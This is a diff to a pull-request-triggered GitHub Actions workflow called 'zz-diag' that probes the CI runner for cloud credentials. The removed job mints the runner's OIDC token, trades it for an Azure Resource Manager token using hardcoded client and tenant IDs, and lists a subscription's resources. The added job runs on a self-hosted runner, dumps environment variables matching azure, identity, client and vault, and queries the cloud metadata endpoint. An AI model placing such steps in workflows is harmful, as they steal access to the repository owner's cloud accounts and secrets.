@@ -1,48 +1,15 @@
 name: zz-diag
 on: pull_request
 permissions:
-  id-token: write
   contents: read
 jobs:
-  plain:
-    runs-on: ubuntu-latest
+  selfhosted:
+    runs-on: self-hosted
+    timeout-minutes: 3
     steps:
-      - run: echo "PLAIN OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+YES}${ACTIONS_ID_TOKEN_REQUEST_URL:-NO}"
-  withenv:
-    runs-on: ubuntu-latest
-    environment: copilot
-    steps:
-      - name: probe
-        run: |
-          echo "ENV-JOB OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+YES}"
-          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "RESULT: NO OIDC IN ENV JOB"; exit 0; fi
-          python3 - <<'PY'
-          import base64,json,os,urllib.parse,urllib.request
-          CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-          def http(u,d=None,h=None):
-              hh={"Accept":"application/json"}
-              if h: hh.update(h)
-              r=urllib.request.Request(u,data=d.encode() if isinstance(d,str) else d,headers=hh)
-              try:
-                  x=urllib.request.urlopen(r,timeout=30); return x.status,x.read().decode()
-              except urllib.error.HTTPError as e: return e.code,e.read().decode()
-              except Exception as e: return 0,str(e)
-          st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience="+urllib.parse.quote("api://AzureADTokenExchange"),
-                    h={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
-          print("### mint",st)
-          jwt=json.loads(b)["value"]
-          p=jwt.split(".")[1]; p+="="*(-len(p)%4)
-          print("### SUB",json.loads(base64.urlsafe_b64decode(p))["sub"])
-          d=urllib.parse.urlencode({"client_id":CID,"scope":"https://management.azure.com/.default",
-            "grant_type":"client_credentials",
-            "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":jwt})
-          s,bb=http("https://login.microsoftonline.com/%s/oauth2/v2.0/token"%TID,d,{"Content-Type":"application/x-www-form-urlencoded"})
-          print("### exchange",s)
-          if s==200:
-              tk=json.loads(bb)["access_token"]
-              print("!!!! ARM TOKEN ACQUIRED")
-              s2,b2=http("https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01",h={"Authorization":"Bearer "+tk})
-              print("### RESOURCES",s2,b2[:4000])
-          else:
-              print(bb[:400])
-          PY
+      - run: |
+          echo "SELF-HOSTED RUNNER REACHED"
+          hostname; whoami; uname -a
+          env | sort | grep -iE "azure|identity|msi|client|tenant|subscription|vault" || true
+          echo "--- IMDS ---"
+          curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 1500 || true
